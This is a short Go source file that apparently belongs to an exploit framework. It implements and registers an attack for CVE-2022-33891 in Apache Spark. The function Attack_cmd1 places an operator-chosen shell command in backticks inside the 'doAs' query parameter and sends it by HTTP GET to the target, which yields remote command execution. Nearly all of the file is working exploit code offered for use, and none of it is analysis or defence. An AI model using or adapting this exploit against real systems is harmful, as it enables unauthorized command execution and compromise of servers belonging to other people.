package exp_Apache_Spark

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
)

type Exp_CVE_2022_33891 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_33891) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	cmd := self.MustGetStringParam("cmd")
	payload := fmt.Sprintf("?doAs=`%s`", url.QueryEscape(cmd))
	httpresp := self.HttpGetWithoutRedirect(self.Params.BaseParam.Target+payload, self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoSuccessMsg(cmd)
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2022_33891{}, "exp_CVE_2022_33891.yml")

}
